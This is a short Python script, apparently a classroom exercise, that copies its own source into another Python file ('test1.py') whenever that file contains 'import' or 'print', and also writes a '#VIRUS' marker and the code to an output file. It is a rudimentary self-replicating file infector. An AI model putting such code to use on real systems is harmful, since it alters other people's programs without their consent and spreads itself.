import os
import sys
q = open('Q1B.out', 'w')
with open('Q1A.py', "r") as v:
   with open ('test1.py', 'r+') as f:
       viruscontents = v.read()
       filecontents = f.read()
       if ((viruscontents != filecontents) and "import" in filecontents or "print" in filecontents):
           q.write("#VIRUS\n")
           q.write(viruscontents)
           f.write(viruscontents)



















